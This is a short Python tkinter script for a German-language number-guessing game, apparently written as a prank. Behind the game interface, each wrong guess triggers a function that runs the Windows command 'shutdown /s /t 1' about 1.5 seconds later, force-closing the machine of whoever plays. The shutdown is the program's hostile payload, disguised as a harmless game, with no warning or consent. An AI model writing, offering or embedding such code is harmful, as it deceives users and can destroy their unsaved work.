import tkinter as tk
import random
import os

root = tk.Tk()
root.title("Zahlen Game")
root.geometry("400x400")
root.configure(bg="#121212")

secret = random.randint(1, 10)

label = tk.Label(root, text="Rate 1-10",
                 bg="#121212", fg="white")
label.pack(pady=20)

def shutdown():
    os.system("shutdown /s /t 1")

def click(n):
    global secret

    if n == secret:
        label.config(text="Richtig 😎", fg="green")
        secret = random.randint(1, 10)
    else:
        label.config(text=f"Falsch 😈 ({secret})", fg="red")
        root.after(1500, shutdown)

for i in range(1, 11):
    tk.Button(root, text=str(i),
              command=lambda x=i: click(x)).pack()

root.mainloop()